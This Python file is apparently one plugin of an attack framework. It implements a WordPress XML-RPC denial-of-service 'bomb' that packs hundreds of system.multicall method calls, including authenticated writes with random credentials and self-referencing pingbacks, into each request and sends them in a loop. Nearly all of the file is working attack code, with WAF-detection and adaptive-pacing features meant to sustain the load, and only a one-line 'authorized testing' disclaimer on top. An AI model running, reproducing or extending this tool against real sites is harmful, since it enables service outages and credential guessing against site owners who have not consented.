#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
vf_wp_xmlrpc_bomb — WordPress XML-RPC Bomb Attack Plugin

Uses system.multicall to pack hundreds of method calls into ONE HTTP request.
Each call triggers server processing — highest amplification attack (100x).
Part of the Storm-Vx plugin architecture.

FOR AUTHORIZED TESTING ONLY!
"""

from __future__ import annotations

import asyncio
import time
import random
from typing import Dict, Any


from plugin_system import PluginMeta, AttackContext
from tester.vf_attack_base import AttackPlugin, ResponseClass
from vf_common import rand_str, rand_user, rand_pass
import aiohttp


__all__ = ["WpXmlrpcBombPlugin"]


# Methods that require authentication (blog_id, username, password, ...)
_AUTH_METHODS = [
    # READ methods (DB queries)
    ("wp.getPosts",       3),  # blog_id, user, pass — full post query
    ("wp.getComments",    3),  # blog_id, user, pass — comment query with JOINs
    ("wp.getPages",       3),  # blog_id, user, pass — page query
    ("wp.getUsers",       3),  # blog_id, user, pass — user enumeration
    ("wp.getTaxonomies",  3),  # blog_id, user, pass — taxonomy query
    ("wp.getTerms",       4),  # blog_id, user, pass, taxonomy — term query
    ("wp.getMediaLibrary", 3), # blog_id, user, pass — media query
    # WRITE methods (DB writes — MUCH heavier than reads)
    ("wp.newPost",        3),  # blog_id, user, pass — INSERT post (DB WRITE + cache flush)
    ("wp.editPost",       4),  # blog_id, post_id, user, pass — UPDATE post (DB WRITE + revision)
    ("wp.deletePost",     4),  # blog_id, post_id, user, pass — DELETE post (DB WRITE + cache flush)
    ("wp.newComment",     5),  # blog_id, post_id, user, pass, comment — INSERT comment (DB WRITE + spam check + email)
    ("wp.newTerm",        4),  # blog_id, user, pass, taxonomy — INSERT term (DB WRITE)
    ("wp.setOptions",     3),  # blog_id, user, pass — UPDATE options (DB WRITE + cache flush)
    # Legacy methods (full table scans)
    ("metaWeblog.getRecentPosts", 3),  # blog_id, user, pass — Full JOIN query
    ("mt.getRecentPostTitles",    3),  # blog_id, user, pass — Full table scan
    ("metaWeblog.getPost",        4),  # blog_id, post_id, user, pass — Single post query
    ("blogger.getPost",           4),  # blog_id, post_id, user, pass — Legacy query
]

# Methods that do NOT require authentication
_NOAUTH_METHODS = [
    "system.listMethods",
    "system.getCapabilities",
    "system.methodHelp",
    "system.methodSignature",
    "demo.sayHello",
    "demo.addTwoNumbers",
]


def _build_auth_call(method_name: str, blog_id: int,
                     username: str, password: str) -> str:
    """Build a single struct element for an auth-requiring method."""
    # Extra params for methods that need them (e.g. wp.getTerms needs taxonomy)
    extra_params = ""
    if method_name == "wp.getTerms":
        taxonomies = ["category", "post_tag", "nav_menu", "link_category"]
        extra_params = f"\n          <value><string>{random.choice(taxonomies)}</string></value>"

    return (
        "      <value><struct>\n"
        f"        <member><name>methodName</name><value><string>{method_name}</string></value></member>\n"
        "        <member><name>params</name><value><array><data>\n"
        f"          <value><int>{blog_id}</int></value>\n"
        f"          <value><string>{username}</string></value>\n"
        f"          <value><string>{password}</string></value>\n"
        f"{extra_params}\n"
        "        </data></array></value></member>\n"
        "      </struct></value>"
    )


def _build_noauth_call(method_name: str) -> str:
    """Build a single struct element for a no-auth method."""
    return (
        "      <value><struct>\n"
        f"        <member><name>methodName</name><value><string>{method_name}</string></value></member>\n"
        "        <member><name>params</name><value><array><data>\n"
        "        </data></array></value></member>\n"
        "      </struct></value>"
    )


def _build_pingback_call(source_url: str, target_url: str) -> str:
    """Build a single struct element for pingback.ping."""
    return (
        "      <value><struct>\n"
        "        <member><name>methodName</name><value><string>pingback.ping</string></value></member>\n"
        "        <member><name>params</name><value><array><data>\n"
        f"          <value><string>{source_url}</string></value>\n"
        f"          <value><string>{target_url}</string></value>\n"
        "        </data></array></value></member>\n"
        "      </struct></value>"
    )


def _build_multicall_xml(site_root: str, num_calls: int = 300) -> str:
    """Build a complete system.multicall XML-RPC payload.

    Packs *num_calls* method calls into a single XML body using
    string concatenation for maximum performance.

    Args:
        site_root: Base URL of the target WordPress site.
        num_calls: Number of individual method calls to pack (200–500).

    Returns:
        Complete XML-RPC request body as a string.
    """
    calls: list[str] = []
    for _ in range(num_calls):
        roll = random.random()
        if roll < 0.65:
            # Auth-required method
            method_name, _ = random.choice(_AUTH_METHODS)
            blog_id = random.randint(1, 10)
            calls.append(_build_auth_call(method_name, blog_id,
                                          rand_user(), rand_pass()))
        elif roll < 0.80:
            # No-auth method
            method_name = random.choice(_NOAUTH_METHODS)
            calls.append(_build_noauth_call(method_name))
        else:
            # Pingback
            src_path = f"/?p={random.randint(1, 99999)}"
            tgt_path = f"/?p={random.randint(1, 99999)}"
            calls.append(_build_pingback_call(
                site_root.rstrip("/") + src_path,
                site_root.rstrip("/") + tgt_path,
            ))

    inner = "\n".join(calls)

    return (
        '<?xml version="1.0"?>\n'
        "<methodCall>\n"
        "  <methodName>system.multicall</methodName>\n"
        "  <params>\n"
        "    <param><value><array><data>\n"
        f"{inner}\n"
        "    </data></array></value></param>\n"
        "  </params>\n"
        "</methodCall>"
    )


class WpXmlrpcBombPlugin(AttackPlugin):
    """WordPress XML-RPC Bomb — system.multicall with hundreds of methods.

    Packs 200–500 method calls into a single HTTP POST request to
    xmlrpc.php via system.multicall. Each call forces the server to
    authenticate, query the database, or process XML — delivering
    ~100x amplification per request.
    """

    meta = PluginMeta(
        name='wp_xmlrpc_bomb',
        version='1.0.0',
        plugin_type='attack',
        description='WordPress XML-RPC bomb — system.multicall with hundreds of methods per request (100x amplification)',
        tags=['http', 'wordpress', 'xmlrpc', 'amplification', 'cpu-burn'],
        priority=22,
        compatible_profiles=[],
        requirements=['aiohttp'],
    )

    async def _worker_loop(self, context: AttackContext, worker_id: int) -> None:
        """XML-RPC bomb worker: pack hundreds of calls into one request."""
        _ssl = context.ssl_param

        site_root = context.url
        url = site_root.rstrip("/") + "/xmlrpc.php"
        delay_ms = context.extra.delay_ms
        min_calls = getattr(context.extra, 'multicall_min', 300)
        max_calls = getattr(context.extra, 'multicall_max', 1000)

        while not self._stop_event.is_set():
            try:
                num_calls = random.randint(min_calls, max_calls)
                xml_body = _build_multicall_xml(site_root, num_calls)

                headers = self._get_fresh_headers(context, "document")
                headers["Content-Type"] = "text/xml"

                t = time.monotonic()
                try:
                    async with context.session.post(
                        url, headers=headers, data=xml_body,
                        ssl=_ssl, allow_redirects=False,
                    ) as resp:
                        rt = time.monotonic() - t
                        # BUG-FIX v34: Use _process_response for WAF detection,
                        # adaptive pacing, and target weighting
                        resp_headers = dict(resp.headers)
                        response_class = self._process_response(
                            resp.status, resp_headers,
                            url=url[:60], worker_id=worker_id
                        )
                        ok = response_class in (
                            ResponseClass.OK, ResponseClass.REDIRECT,
                            ResponseClass.AUTH_REQUIRED, ResponseClass.SERVER_ERROR
                        )
                        self._capture_response_cookies(resp, context)
                        await self._record(
                            "WP-XMLRPC", ok, resp.status, rt,
                            url=url[:60],
                            hint=f"multicall={num_calls}",
                        )
                except asyncio.CancelledError:
                    raise
                except (aiohttp.ClientError, asyncio.TimeoutError, OSError) as exc:
                    rt = time.monotonic() - t
                    self._on_request_result(worker_id, False)
                    await self._record(
                        "WP-XMLRPC", False, 0, rt,
                        err=type(exc).__name__,
                        url=url[:60],
                        hint=f"multicall={num_calls}",
                    )

                # BUG-FIX v34: Use adaptive sleep instead of raw asyncio.sleep
                await self._adaptive_sleep(worker_id, delay_ms)

            except asyncio.CancelledError:
                return
            except (aiohttp.ClientError, asyncio.TimeoutError, OSError) as exc:
                await self._record("WP-XMLRPC", False, 0, 0,
                                   err=type(exc).__name__)
                await asyncio.sleep(0.1)

